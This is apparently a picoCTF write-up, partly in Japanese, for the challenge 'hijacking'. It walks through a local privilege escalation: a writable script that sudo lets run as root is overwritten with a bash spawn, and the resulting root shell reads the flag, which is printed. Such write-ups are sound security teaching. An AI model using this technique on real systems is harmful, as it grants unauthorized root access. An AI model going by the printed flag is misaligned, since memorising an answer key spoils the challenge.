# hijacking:bynary Medium  
Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.  

Additional details will be available after launching your challenge instance.  

# Solution  
ssh接続する  
ssh -p 56840 picoctf@saturn.picoctf.net  
The authenticity of host '[saturn.picoctf.net]:56840 ([13.59.203.175]:56840)'n't be established.  
ED25519 key fingerprint is SHA256:lAxuAwDPxkngr5Aw0vqCbwmNz/+0ii8HjltkWeRcMjw.  
This host key is known by the following other names/addresses:  
    ~/.ssh/known_hosts:32: [hashed name]  
    ~/.ssh/known_hosts:35: [hashed name]  
    ~/.ssh/known_hosts:36: [hashed name]  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '[saturn.picoctf.net]:56840' (ED25519) to the list of known hosts.  
picoctf@saturn.picoctf.net's password:   
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)  

 * Documentation:  https://help.ubuntu.com  
 * Management:     https://landscape.canonical.com  
 * Support:        https://ubuntu.com/advantage  

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.  

To restore this content, you can run the 'unminimize' command.  

picoctf@challenge:~$ ls -la  
total 16  
drwxr-xr-x 1 picoctf picoctf   20 Jul  6 06:39 .  
drwxr-xr-x 1 root    root      21 Aug  4  2023 ..  
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout  
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc  
drwx------ 2 picoctf picoctf   34 Jul  6 06:39 .cache  
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile  
-rw-r--r-- 1 root    root     375 Feb  7  2024 .server.py  


The programs included with the Ubuntu system are free software;  
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.  

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.  

picoctf@challenge:~$ sudo -l  
Matching Defaults entries for picoctf on challenge:  
    env_reset, mail_badpass,  
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  

User picoctf may run the following commands on challenge:  
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py  

picoctf@challenge:〜$ cat .server.py  
import base64  
import os  
import socket  
ip = 'picoctf.org'  
response = os.system("ping -c 1 " + ip)  
#saving ping details to a variable  
host_info = socket.gethostbyaddr(ip)   
#getting IP from a domaine  
host_info_to_str = str(host_info[2])  
host_info = base64.b64encode(host_info_to_str.encode('ascii'))  
print("Hello, this is a part of information gathering",'Host: ', host_info)  
picoctf@challenge:~$ vi .server.py  
picoctf@challenge:~$ cat .server.py  
import os  
os.system("/bin/bash")  

picoctf@challenge:〜$ sudo /usr/bin/python3 /home/picoctf/.server.py  
root@challenge:/home/picoctf# ls -la  
total 24  
drwxr-xr-x 1 picoctf picoctf   73 Jul  6 06:42 .  
drwxr-xr-x 1 root    root      21 Aug  4  2023 ..  
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout  
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc  
drwx------ 2 picoctf picoctf   34 Jul  6 06:39 .cache  
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile  
-rw-r--r-- 1 picoctf picoctf   33 Jul  6 06:42 .server.py  
-rw-r--r-- 1 picoctf picoctf  375 Feb  7  2024 .server.py~  
-rw------- 1 picoctf picoctf  812 Jul  6 06:42 .viminfo  
root@challenge:/home/picoctf# cd /  
root@challenge:/# ls -la  
total 0  
drwxr-xr-x   1 root   root     51 Jul  6 06:38 .  
drwxr-xr-x   1 root   root     51 Jul  6 06:38 ..  
-rwxr-xr-x   1 root   root      0 Jul  6 06:38 .dockerenv  
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin  
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot  
d---------   1 root   root      6 Sep 26  2024 challenge  
drwxr-xr-x   5 root   root    340 Jul  6 06:38 dev  
drwxr-xr-x   1 root   root     66 Jul  6 06:38 etc  
drwxr-xr-x   1 root   root     21 Aug  4  2023 home  
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib  
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32  
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64  
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32  
drwxr-xr-x   2 root   root      6 Mar  8  2023 media  
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt  
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt  
dr-xr-xr-x 241 nobody nogroup   0 Jul  6 06:38 proc  
drwx------   1 root   root     23 Sep 26  2024 root  
drwxr-xr-x   1 root   root     54 Jul  6 06:39 run  
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin  
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv  
dr-xr-xr-x  13 nobody nogroup   0 Jul  6 06:38 sys  
drwxrwxrwt   1 root   root      6 Sep 26  2024 tmp  
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr  
drwxr-xr-x   1 root   root     17 Mar  8  2023 var  
root@challenge:/# cd root  
root@challenge:~# ls -la  
drwx------ 1 root root   23 Sep 26  2024 .  
drwxr-xr-x 1 root root   51 Jul  6 06:38 ..  
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc  
-rw-r--r-- 1 root root   43 Sep 26  2024 .flag.txt  
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile  
root@challenge:〜# cat .flag.txt  
picoCTF{pYth0nn_libraryH!j@CK!n9_6924176e}  

# 考えたこと  
ユーザ権限をルートへの昇格を狙う。  
SUDO -lをしたところ/usr/bin/python3 /home/picoctf/.server.pyはパスワードがいらないことがわかった。  
なので、次に.server.pyを編集する。（.server.pyに書き込み権限があるため実行できる）  
そして、SUDOで/usr/bin/python3 /home/picoctf/.server.pyを実行するとルートへ昇格できた。  
最後にルートディレクトリのFLAG.txtをcatコマンドで実行するとFLAG.txtが獲得できた  

# ポイント  
sudoでpyton3プロセスが起動するー＞python3がルート権限で実行される。  
その後、.server.pyが実行されると内部のos．sytem（"/bin/bash"）が実行される。  
よって、ルート権限をもつbashプロセスがターミナルに表示される。  
＊pyton3のルート権限を引き継いでいるだけなのでos．sytem（"/bin/bash"）を実行すると権限が昇格するわけではない  